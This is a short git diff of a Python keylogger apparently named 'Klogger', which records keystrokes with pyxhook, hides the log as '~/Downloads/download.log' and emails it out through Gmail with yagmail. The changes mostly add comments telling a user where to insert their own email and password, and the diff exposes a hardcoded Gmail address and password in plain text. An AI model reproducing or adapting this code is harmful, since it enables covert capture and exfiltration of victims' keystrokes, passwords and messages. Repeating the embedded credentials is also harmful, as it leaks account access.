@@ -13,10 +13,10 @@ from apscheduler.schedulers.blocking import BlockingScheduler
 # This email is open to testing purposes for the next 2 weeks
 ###############
 def sendLog(log):
-    sender_email = "kloggertest42069@gmail.com"
-    receiver_email = "kloggertest42069@gmail.com"
+    sender_email = "kloggertest42069@gmail.com" #Insert your email here
+    receiver_email = "kloggertest42069@gmail.com" #and here
     subject = "Klogger"
-    sender_password = "rotkiv1234"
+    sender_password = "rotkiv1234" #email password here
 
     yag = yagmail.SMTP(user=sender_email, password=sender_password)
 
@@ -29,15 +29,16 @@ def sendLog(log):
 
 ############
 # Keylogger function
-# You can change the directory and/or name of the log "keylog.txt"
+# You can change the directory and/or name of the log "download.log"
 # Only emits new line/linebreak when user presses enter or Tab
+# If no directory is entered but only file name, it saves where the keylogger is
 # Uses file write to insert into log, pyxhook to grab keystrokes
 ############
 def Klogger():
 
     log = os.environ.get(
         'pylogger_file',
-        os.path.expanduser('~/Downloads/download.log')
+        os.path.expanduser('~/Downloads/download.log') #Directory of log file
     )
 
     user = os.path.expanduser("~")
